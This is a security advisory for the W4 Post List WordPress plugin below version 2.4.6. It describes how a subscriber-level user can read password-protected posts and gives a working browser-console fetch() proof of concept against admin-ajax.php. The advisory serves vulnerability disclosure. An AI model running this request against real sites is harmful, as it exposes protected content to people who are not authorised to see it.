## WordPress Plugin Vulnerabilities

# W4 Post List < 2.4.6 - Subscriber+ Password Protected Post Content Disclosure

### Description

The plugin does not ensure that password protected posts can be accessed before displaying their content, which could allow any authenticated users to access them

### Proof of Concept

Setup: Create a default Post list, and create a password protected post with secret content
Then, run the below command in the developer console of the web browser while being on the blog as a subscriber user
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[postlist listId='1']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
This will display the content of the password protected post
